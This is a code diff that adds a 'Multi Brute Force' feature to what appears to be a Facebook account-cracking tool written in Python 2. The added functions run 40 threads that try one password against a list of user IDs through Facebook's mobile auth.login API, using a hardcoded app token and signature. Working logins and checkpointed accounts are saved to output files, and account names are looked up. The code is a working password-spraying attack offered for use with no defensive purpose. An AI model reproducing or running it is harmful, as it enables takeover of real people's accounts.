@@ -1160,7 +1160,88 @@ def mini():
 		menu_hack()
 										
 							
-	
+##### Multi Brute Force #####
+##### CRACK ####
+def crack():
+	global idlist,passw,file
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
+	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
+	try:
+		file = open((idlist), "r")
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		for x in range(40):
+			zedd = threading.Thread(target=scrak, args=())
+			zedd.start()
+			threads.append(zedd)
+		for zedd in threads:
+			zedd.join()
+	except IOError:
+		print ("\033[1;91m[!] File not found")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_hack()
+		
+def scrak():
+	global berhasil,cekpoint,gagal,back,up
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		buka = open(idlist, "r")
+		up = buka.read().split()
+		while file:
+			username = file.readline().strip()
+			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+			data = urllib.urlopen(url)
+			mpsh = json.load(data)
+			if back == (len(up)):
+				break
+			if 'access_token' in mpsh:
+				bisa = open("out/mbf_ok.txt", "w")
+				bisa.write(username+"|"+passw+"\n")
+				bisa.close()
+				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
+				z = json.loads(x.text)
+				berhasil.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
+			elif 'www.facebook.com' in mpsh["error_msg"]:
+				cek = open("out/mbf_cp.txt", "w")
+				cek.write(username+"|"+passw+"\n")
+				cek.close()
+				cekpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
+			else:
+				gagal.append(username)
+				back +=1
+			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
+	except IOError:
+		print"\n\033[1;91m[!] Sleep"
+		time.sleep(1)
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		
+def hasil():
+	print
+	print 42*"\033[1;97m═"
+	###Berhasil
+	for b in berhasil:
+		print(b)
+	###CEK
+	for c in cekpoint:
+		print(c)
+	###Gagal
+	print 42*"\033[1;97m═"
+	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(gagal)))
+	keluar()
+		
 ############### SUPER MBF ################
 def super():
 	global toket
